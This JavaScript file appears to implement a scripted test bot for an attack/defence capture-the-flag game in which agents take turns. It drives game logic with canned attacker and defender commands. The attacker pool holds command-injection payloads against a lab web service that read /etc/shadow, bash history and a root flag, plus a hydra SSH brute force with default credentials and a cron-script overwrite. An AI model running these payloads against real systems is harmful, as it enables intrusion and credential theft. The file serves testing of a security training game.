const { BaseAgent } = require('../base-agent.js');

/**
 * Scripted bot provider for testing game logic without API costs.
 *
 * Variation strategy:
 * - Each bot gets a shuffled copy of the command pool at construction time
 * - Attackers randomly pick which target to hit each turn
 * - Random "improvised" commands are injected periodically
 * - Some commands intentionally fail (bad syntax, wrong paths) to test error handling
 * - Flag-capturing commands are guaranteed to appear within the first N turns
 *   so scoring logic is always exercised
 */
class ScriptedBotAgent extends BaseAgent {
  constructor(opts) {
    super({ ...opts, provider: 'scripted-bot' });
    this.commandIndex = 0;

    // Each bot gets its own shuffled command sequence for variation
    const base = this.role === 'attacker' ? [...ATTACKER_SCRIPTS] : [...DEFENDER_SCRIPTS];
    this.scripts = this.buildVariedSequence(base);
  }

  /**
   * Build a varied command sequence:
   * - Shuffle the base commands (but keep guaranteed-capture commands in early slots for attackers)
   * - Sprinkle in random improvised commands
   * - Add some intentionally broken commands to test error handling
   */
  buildVariedSequence(base) {
    const sequence = [];

    if (this.role === 'attacker') {
      // Ensure flag-capture commands land in turns 3-6 so scoring is always tested
      const captureCommands = base.filter((c) => c.guaranteeCapture);
      const otherCommands = shuffle(base.filter((c) => !c.guaranteeCapture));

      // Turns 0-2: recon (shuffled)
      const recon = otherCommands.splice(0, 3);
      sequence.push(...recon);

      // Turns 3-5: guaranteed capture commands (shuffled among themselves)
      sequence.push(...shuffle(captureCommands));

      // Remaining turns: rest of commands shuffled + improvised commands injected
      const rest = shuffle(otherCommands);
      for (const cmd of rest) {
        sequence.push(cmd);
        // 30% chance to inject an improvised command after each scripted one
        if (Math.random() < 0.3) {
          sequence.push(pickRandom(IMPROVISED_ATTACKER));
        }
      }

      // Add some intentionally failing commands to test error handling
      sequence.splice(randInt(2, 4), 0, pickRandom(FAILING_COMMANDS));
      sequence.splice(randInt(7, 10), 0, pickRandom(FAILING_COMMANDS));
    } else {
      // Defenders: keep first 2 commands (password changes) at top, shuffle the rest
      const priority = base.slice(0, 2);
      const rest = shuffle(base.slice(2));
      sequence.push(...priority);

      for (const cmd of rest) {
        sequence.push(cmd);
        if (Math.random() < 0.25) {
          sequence.push(pickRandom(IMPROVISED_DEFENDER));
        }
      }

      // Inject a failing command somewhere in the middle
      sequence.splice(randInt(3, 6), 0, pickRandom(FAILING_COMMANDS));
    }

    return sequence;
  }

  async callModel(_messages) {
    const entry = this.scripts[this.commandIndex % this.scripts.length];
    this.commandIndex++;

    let command = entry.command;
    let thinking = entry.thinking;

    // For attackers, pick a random target each turn (not just cycling)
    if (this.role === 'attacker') {
      const targets = this.extractTargets(_messages);
      if (targets.length > 0) {
        const target = pickRandom(targets);
        command = command.replace(/\{TARGET_IP\}/g, target.ip);
        command = command.replace(/\{TARGET_HOST\}/g, target.hostname);
        thinking = thinking.replace(/\{TARGET_IP\}/g, target.ip);
        thinking = thinking.replace(/\{TARGET_HOST\}/g, target.hostname);
      }
    }

    // Simulate variable API latency (50-300ms)
    await new Promise((r) => setTimeout(r, 50 + Math.random() * 250));

    // Occasionally return responses in slightly different formats to test parsing
    const format = this.commandIndex % 7;
    let text;
    if (format === 3) {
      // Code block format
      text = `THINKING: ${thinking}\n\`\`\`bash\n${command}\n\`\`\``;
    } else if (format === 5) {
      // No explicit THINKING label — just reasoning then command
      text = `${thinking}\n\nCOMMAND: ${command}`;
    } else {
      // Standard format
      text = `THINKING: ${thinking}\nCOMMAND: ${command}`;
    }

    return {
      text,
      thinking,
      tokensUsed: 0,
    };
  }

  extractTargets(messages) {
    const targets = [];
    for (const msg of messages) {
      const matches = msg.content?.matchAll(/(\w+):\s+(10\.10\.0\.\d+)\s+\((\S+)\)/g);
      if (matches) {
        for (const m of matches) {
          if (m[1] !== this.playerId) {
            targets.push({ id: m[1], ip: m[2], hostname: m[3] });
          }
        }
      }
    }
    const seen = new Set();
    return targets.filter((t) => {
      if (seen.has(t.id)) return false;
      seen.add(t.id);
      return true;
    });
  }
}

// --- Utility functions ---

function shuffle(arr) {
  const a = [...arr];
  for (let i = a.length - 1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i + 1));
    [a[i], a[j]] = [a[j], a[i]];
  }
  return a;
}

function pickRandom(arr) {
  return arr[Math.floor(Math.random() * arr.length)];
}

function randInt(min, max) {
  return Math.floor(Math.random() * (max - min + 1)) + min;
}

// =============================================================================
// COMMAND POOLS
// =============================================================================

/**
 * Attacker commands. Commands with guaranteeCapture: true will be placed
 * in early turns to ensure flag captures happen and scoring is tested.
 */
const ATTACKER_SCRIPTS = [
  // --- Recon commands ---
  {
    thinking: 'Starting with a network scan to identify live hosts and open ports on the target network.',
    command: 'nmap -sV -p 22,8080 10.10.0.0/24 --open',
  },
  {
    thinking: 'Running a ping sweep to quickly identify which hosts are up before doing deeper scans.',
    command: 'for i in 10 20 30 40 50; do ping -c 1 -W 1 10.10.0.$i && echo "HOST UP: 10.10.0.$i"; done 2>/dev/null',
  },
  {
    thinking: 'Checking what services are running on {TARGET_IP}. A full service scan will reveal potential attack vectors.',
    command: 'nmap -sV -sC -p 1-1024 {TARGET_IP} 2>/dev/null | head -40',
  },
  {
    thinking: 'Probing the web service on {TARGET_IP} to understand what endpoints are available.',
    command: 'curl -s http://{TARGET_IP}:8080/status && curl -s -o /dev/null -w "%{http_code}" http://{TARGET_IP}:8080/ping',
  },

  // --- Exploitation commands (non-capture) ---
  {
    thinking: 'Testing command injection on {TARGET_IP} web service. The /ping endpoint likely passes input to shell unsanitized.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=127.0.0.1;id"',
  },
  {
    thinking: 'Enumerating users and checking sudo configuration on {TARGET_IP} via command injection.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;cat+/etc/passwd+|+grep+-v+nologin"',
  },
  {
    thinking: 'Checking if /etc/shadow is world-readable on {TARGET_IP}. If so, I can extract password hashes.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;cat+/etc/shadow+|+head+-5"',
  },
  {
    thinking: 'Looking for SUID binaries on {TARGET_IP} that could enable privilege escalation.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;find+/usr/bin+-perm+-4000+-type+f+2>/dev/null"',
  },
  {
    thinking: 'Checking bash history on {TARGET_IP} for leaked credentials or interesting commands.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;cat+/root/.bash_history"',
  },
  {
    thinking: 'Looking for config files with database credentials on {TARGET_IP}.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;cat+/etc/app/database.yml"',
  },
  {
    thinking: 'Checking if the cron backup script on {TARGET_IP} is writable. Could use it for persistent access.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;ls+-la+/opt/scripts/backup.sh"',
  },
  {
    thinking: 'Attempting SSH brute force against {TARGET_IP} with common credential pairs.',
    command: 'echo -e "root:toor\nctfservice:service123\nadmin:admin\nroot:root\nroot:password" > /tmp/creds.txt && hydra -C /tmp/creds.txt {TARGET_IP} ssh -t 4 2>/dev/null | head -20',
  },
  {
    thinking: 'Trying to write a reverse shell into the writable cron job on {TARGET_IP}.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;echo+cp+/root/flag.txt+/tmp/flag_exfil.txt+>+/opt/scripts/backup.sh"',
  },
  {
    thinking: 'Checking if the cron exfiltration worked on {TARGET_IP}.',
    command: 'sleep 2 && curl -s "http://{TARGET_IP}:8080/ping?host=;cat+/tmp/flag_exfil.txt"',
  },
  {
    thinking: 'Using SUID find to read the flag on {TARGET_IP} via command injection.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;find+/root/flag.txt+-exec+cat+{}+\\;"',
  },

  // --- Guaranteed capture commands (will be placed in early turns) ---
  {
    guaranteeCapture: true,
    thinking: 'Attempting direct flag read via command injection on {TARGET_IP}. This is the simplest exploitation path.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=127.0.0.1;cat+/root/flag.txt"',
  },
  {
    guaranteeCapture: true,
    thinking: 'Trying SSH with default root credentials on {TARGET_IP}. Many CTF boxes ship with root:toor.',
    command: 'sshpass -p "toor" ssh -o StrictHostKeyChecking=no root@{TARGET_IP} "cat /root/flag.txt" 2>/dev/null || echo "SSH failed"',
  },
  {
    guaranteeCapture: true,
    thinking: 'Using the ctfservice account with sudo to read the flag on {TARGET_IP}. If NOPASSWD sudo is configured, this bypasses file permissions.',
    command: 'sshpass -p "service123" ssh -o StrictHostKeyChecking=no ctfservice@{TARGET_IP} "sudo cat /root/flag.txt" 2>/dev/null || echo "sudo failed"',
  },
];

/**
 * Defender commands.
 */
const DEFENDER_SCRIPTS = [
  // --- Priority: password changes (always first) ---
  {
    thinking: 'CRITICAL: Change the root password immediately. Default weak passwords are the #1 attack vector.',
    command: 'echo "root:$(openssl rand -base64 24)" | chpasswd && echo "Root password changed"',
  },
  {
    thinking: 'Changing ctfservice password. If it has sudo privileges, a weak password is a critical risk.',
    command: 'echo "ctfservice:$(openssl rand -base64 24)" | chpasswd && echo "ctfservice password changed"',
  },

  // --- Remaining defenses (will be shuffled) ---
  {
    thinking: 'Fixing /etc/shadow permissions. World-readable shadow files expose password hashes to any local user.',
    command: 'chmod 640 /etc/shadow && chown root:shadow /etc/shadow && echo "Shadow permissions fixed"',
  },
  {
    thinking: 'Removing NOPASSWD sudo for ctfservice. This is a critical privilege escalation vector.',
    command: 'rm -f /etc/sudoers.d/ctfservice && echo "Removed NOPASSWD sudo for ctfservice"',
  },
  {
    thinking: 'Securing the cron backup script. World-writable cron scripts allow arbitrary code execution as root.',
    command: 'chmod 700 /opt/scripts/backup.sh && chown root:root /opt/scripts/backup.sh && echo "Cron script secured"',
  },
  {
    thinking: 'Removing SUID bit from find. GTFOBins lists find as a trivial privilege escalation vector with SUID.',
    command: 'chmod u-s /usr/bin/find && echo "SUID removed from find"',
  },
  {
    thinking: 'Deploying iptables firewall. Allowing SSH and blocking everything else including the vulnerable web service.',
    command: 'iptables -F && iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT && iptables -A INPUT -p tcp --dport 22 -j ACCEPT && iptables -A INPUT -i lo -j ACCEPT && iptables -A INPUT -j DROP && echo "Firewall configured"',
  },
  {
    thinking: 'Killing the vulnerable web service. Command injection on port 8080 is too dangerous to leave running.',
    command: 'pkill -f "server.py" && echo "Vulnerable web service killed"',
  },
  {
    thinking: 'Removing credential leaks from bash history and config files.',
    command: 'rm -f /root/.bash_history && rm -f /etc/app/database.yml && history -c && echo "Credential files cleaned"',
  },
  {
    thinking: 'Hardening flag.txt permissions. Ensuring only root can read it.',
    command: 'chmod 600 /root/flag.txt && chown root:root /root/flag.txt && echo "Flag permissions verified"',
  },
  {
    thinking: 'Checking network connections for signs of active intrusion.',
    command: 'ss -tunp | grep -v "127.0.0.1" | head -20',
  },
  {
    thinking: 'Auditing running processes for suspicious activity — shells, netcat, reverse connections.',
    command: 'ps aux | grep -E "(sh|bash|nc|ncat|python|perl)" | grep -v grep | head -20',
  },
  {
    thinking: 'Reviewing auth logs for brute force attempts or unauthorized logins.',
    command: 'cat /var/log/auth.log 2>/dev/null | tail -20 || journalctl -u ssh --no-pager -n 20 2>/dev/null',
  },
  {
    thinking: 'Running a full security audit to verify all defenses are still in place.',
    command: 'echo "=== Security Audit ===" && ls -la /etc/shadow && ls -la /root/flag.txt && ls -la /opt/scripts/backup.sh && iptables -L -n --line-numbers 2>/dev/null | head -15',
  },
  {
    thinking: 'Monitoring /tmp for exfiltration attempts and checking established connections.',
    command: 'find /tmp -newer /root/flag.txt -type f 2>/dev/null && ss -tunp | grep ESTABLISHED | head -10',
  },
];

/**
 * Improvised attacker commands — injected randomly for variation.
 */
const IMPROVISED_ATTACKER = [
  {
    thinking: 'Trying a different angle — checking if netcat can establish a connection to {TARGET_IP} on unusual ports.',
    command: 'nc -zv {TARGET_IP} 80 443 3306 6379 2>/dev/null; echo "Port scan complete"',
  },
  {
    thinking: 'Attempting to grab SSH banner from {TARGET_IP} for version fingerprinting.',
    command: 'echo "" | nc -w 3 {TARGET_IP} 22 2>/dev/null | head -1',
  },
  {
    thinking: 'Trying path traversal on the web service of {TARGET_IP} in case there are hidden endpoints.',
    command: 'for path in /admin /debug /config /backup /api; do echo -n "$path: "; curl -s -o /dev/null -w "%{http_code}" http://{TARGET_IP}:8080$path; echo; done',
  },
  {
    thinking: 'Checking if {TARGET_IP} has any world-writable directories I can use for staging.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;find+/+(-writable+-type+d+2>/dev/null+|+head+-10)"',
  },
  {
    thinking: 'Looking for SSH keys on {TARGET_IP} that might allow passwordless access to other machines.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;ls+-la+/root/.ssh/+2>/dev/null"',
  },
  {
    thinking: 'Enumerating the kernel version on {TARGET_IP} to check for known local exploits.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;uname+-a"',
  },
  {
    thinking: 'Checking if wget or curl can reach other targets from {TARGET_IP} — pivoting potential.',
    command: 'curl -s "http://{TARGET_IP}:8080/ping?host=;curl+-s+http://10.10.0.10:8080/status"',
  },
];

/**
 * Improvised defender commands — injected randomly for variation.
 */
const IMPROVISED_DEFENDER = [
  {
    thinking: 'Checking for any unauthorized SSH keys that might have been planted.',
    command: 'ls -la /root/.ssh/ 2>/dev/null && cat /root/.ssh/authorized_keys 2>/dev/null || echo "No SSH keys found"',
  },
  {
    thinking: 'Disabling SSH password authentication — only key-based auth should be allowed.',
    command: 'sed -i "s/PasswordAuthentication yes/PasswordAuthentication no/" /etc/ssh/sshd_config && service ssh restart && echo "SSH password auth disabled"',
  },
  {
    thinking: 'Checking for files modified in the last 5 minutes — could indicate active intrusion.',
    command: 'find / -mmin -5 -type f -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20',
  },
  {
    thinking: 'Adding a tripwire on the flag file — logging any access attempts.',
    command: 'apt-get install -y inotify-tools 2>/dev/null; inotifywait -m /root/flag.txt -e access -t 5 2>/dev/null &',
  },
  {
    thinking: 'Checking for world-writable files outside /tmp that could be exploited.',
    command: 'find / -writable -type f -not -path "/tmp/*" -not -path "/proc/*" -not -path "/sys/*" -not -path "/dev/*" 2>/dev/null | head -15',
  },
  {
    thinking: 'Disabling root login via SSH as an additional hardening measure.',
    command: 'sed -i "s/PermitRootLogin yes/PermitRootLogin no/" /etc/ssh/sshd_config && service ssh restart && echo "Root SSH login disabled"',
  },
];

/**
 * Intentionally broken commands to test error handling.
 */
const FAILING_COMMANDS = [
  {
    thinking: 'Trying to use a tool that might not be installed to test fallback behavior.',
    command: 'sqlmap -u "http://{TARGET_IP}:8080/ping?host=test" --batch 2>&1 | head -5 || echo "sqlmap not available"',
  },
  {
    thinking: 'Attempting to access a path that probably does not exist.',
    command: 'cat /opt/secret/credentials.json 2>&1 || echo "File not found"',
  },
  {
    thinking: 'Running a command with a deliberate typo to see how output is handled.',
    command: 'nmapp -sV {TARGET_IP} 2>&1 || echo "Command failed"',
  },
  {
    thinking: 'Trying to connect to a port that is likely closed.',
    command: 'nc -w 2 {TARGET_IP} 9999 2>&1; echo "Connection attempt finished with exit code $?"',
  },
];

module.exports = { ScriptedBotAgent };
